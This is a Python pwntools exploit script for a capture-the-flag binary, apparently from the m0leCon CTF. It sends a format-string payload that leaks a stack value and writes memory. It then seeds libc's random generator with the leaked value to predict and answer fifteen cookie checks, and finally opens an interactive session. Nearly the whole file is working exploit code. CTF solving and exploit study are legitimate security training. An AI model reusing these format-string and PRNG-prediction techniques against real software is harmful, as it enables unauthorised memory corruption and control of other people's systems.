from pwn import *
from ctypes import *
import time
binf = ELF("chall")
libc = ELF.libc

'''
main 0x14b5
lectura del 1 fopen = 0x5555555554e3 = 0xfbad2488
0x555555555521 <main+108>    mov    eax, dword ptr [rbp - 0x14] antes de srand
0X133C IN-WHILE
'''

gs = '''
break *0x000055555555533c
break *0x0000555555555485
'''
def start():
    if args.GDB:
        return gdb.debug(binf.path, gdbscript=gs)
    else:
        return process(binf.path)
        # return remote("challs.m0lecon.it",1907)

context.log_level = "DEBUG"
context.aslr = False

print(binf.plt)

shell=""
shell=b"flag.txt"

# v1 = randomf();
# v2 = (unsigned __int8)(((unsigned __int64)v1 >> 56) + v1) - ((unsigned int)(v1 >> 31) >> 24);

def obt_val(p):
    p.recvuntil("summed to ")
    return int(p.recvuntil("!\n", drop=True))

def exploit(p):
    
    p.recvline()
    sumed=p.recvline()
    sumed=str(sumed).split(',')[1].split(' ')[3].split('!')[0]
    print('type(sumed)> ',type(sumed))
    print('sumed> ',sumed)
    exp='%21$p%8$n'
    p.sendline(exp)
    p.recvuntil("input is: \n")
    leak = int(p.recvline(False), 0x10)
    srand_init = u32(p64(leak)[4:])
    print(">>>>>>>>>> srand_init >>>>>>>>>>>")
    print(hex(srand_init))
    print("<<<<<<<<<<<<<< srand_init <<<<<<")
    if p.recv(4) == b"NOPE":
        p.close()
        return False
    log.info("srand param : " + hex(srand_init))
    MASK32 = 0xffffffff
    MASK8 = 0xff
    libc = CDLL("libc.so.6")
    libc.srand(srand_init)
    def rand(): return libc.rand() & MASK32
    
    def obt_cookie():
        eax = rand()
        edx = eax >> 0x18
        cookie = (eax + edx) & MASK32
        cookie = cookie & MASK8
        cookie = (cookie + MASK32+1 - edx) & MASK8
        return cookie
    
    obt_cookie()
    rand()  
    
    for i in range(0xf):
        cookie = obt_cookie()
        rand()
        v = obt_val(p)
        res = cookie + v
        p.sendline(str(res) + "\x00")
    return True
"""     print('*'*50)
    print('*'*50)
    if p.recv(4) == b"NOPE":
        p.close()
        return False
    return True """



# 27/06/2021
# i=1
# while(True):
# exp+='%21$p'
# exp= '%'+str(10000+11+1)+'x%7$n'
# exp+='%'+str(11)+'x%9$n'
# exp+='%'+str(1)+'x%11$n'
# i=i+1
# sleep(0.4)
# p.sendline('')

while True:
    p=start()
    if exploit(p):
        p.interactive()
        p.close()
        exit()